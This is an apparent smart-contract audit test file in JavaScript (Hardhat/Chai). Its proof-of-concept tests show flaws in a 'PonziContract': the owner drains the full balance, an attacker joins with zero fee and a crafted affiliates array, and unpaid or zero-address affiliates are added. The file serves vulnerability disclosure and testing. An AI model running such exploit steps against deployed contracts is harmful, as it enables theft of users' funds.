const { expect } = require("chai");
const { ethers } = require("hardhat");


describe('Ponzi Contract Critical Issue', function () {
    let owner;
    let affiliate;
    let ponziContract;
  
    beforeEach(async () => {
      [owner,attacker, affiliate ,aff1 , aff2, aff3, aff4 ] = await ethers.getSigners();
  
      const PonziContract = await ethers.getContractFactory('PonziContract');
      ponziContract = await PonziContract.deploy();
      await ponziContract.deployed();
      await ponziContract.setDeadline(9999999999);
    });
  
    it('should allow the owner to drain the contract balance', async function () {
    
     
      await ponziContract.addNewAffilliate(affiliate.address);
      await ponziContract.connect(affiliate).joinPonzi([affiliate.address], { value: ethers.utils.parseEther('1') });
       // Owner can drain contract balance with out any chek or limits
      await ponziContract.connect(owner).ownerWithdraw(owner.address, await ethers.provider.getBalance(ponziContract.address));
  
    
      const contractBalance = await ethers.provider.getBalance(ponziContract.address);
      expect(contractBalance).to.equal(0);
    });
    it('should allow an attacker to add multiple entries with out entry fee', async function () {
        // Attacker joins and deposits a small amount of funds
        await ponziContract.connect(attacker).joinPonzi([], { value: ethers.utils.parseEther('0') });
    
        // Malicious attacker calls joinPonzi with a crafted _afilliates array to drain all funds
        const craftedInput = Array.from({ length: 1 }, () => attacker.address);
        await ponziContract.connect(attacker).joinPonzi(craftedInput, { value: ethers.utils.parseEther('1') });
    
        // Check if the contract balance is zero
        const contractBalance = await ethers.provider.getBalance(ponziContract.address);
        expect(contractBalance).to.equal(0);
      });
      it('should allow the owner to add 0 address as affiliate', async function () {
        // Affiliate joins and deposits funds
       
        await ponziContract.addNewAffilliate("0x0000000000000000000000000000000000000000");
       
    
        // Check if the contract balance is zero
        const affiliateCount = await ponziContract.affiliatesCount();
        expect(affiliateCount).to.equal(1);
      });
    it('should allow the owner to add affiliates with out paying entry fee', async function () {
        // Affiliate joins and deposits funds
        await ponziContract.setDeadline(9999999999);
        await ponziContract.addNewAffilliate(affiliate.address);
        await ponziContract.addNewAffilliate(aff1.address);
        await ponziContract.addNewAffilliate(aff2.address);
        await ponziContract.addNewAffilliate(aff3.address);
       
    
        // Check if the contract balance is zero
        const affiliateCount = await ponziContract.affiliatesCount();
        expect(affiliateCount).to.equal(4);
      });
  });